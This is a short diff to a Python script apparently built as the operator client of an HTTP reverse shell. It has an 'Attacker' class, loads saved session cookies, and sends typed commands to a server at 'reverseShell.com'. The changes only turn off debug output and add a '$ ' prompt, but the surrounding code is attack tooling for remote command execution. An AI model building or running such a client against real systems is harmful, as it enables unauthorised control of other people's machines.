@@ -3,7 +3,7 @@ import logging
 import pickle
 
 class Attacker:
-    DEBUG = True
+    DEBUG = False
 
     # Try to load session cookies from file
     def __tryToLoadSessionCookies(self):
@@ -77,7 +77,7 @@ def printDebug(message, end='\n'):
 
 def main():
     # Module for connection debugging
-    logging.basicConfig(level=logging.DEBUG)
+    #logging.basicConfig(level=logging.DEBUG)
     # Server domain
     baseUrl = 'http://www.reverseShell.com'
     # Store command
@@ -101,6 +101,7 @@ def main():
     '''
     try:
         while True:
+            print('$ ', end='')
             # Get command
             data['cmd'] = input()
 
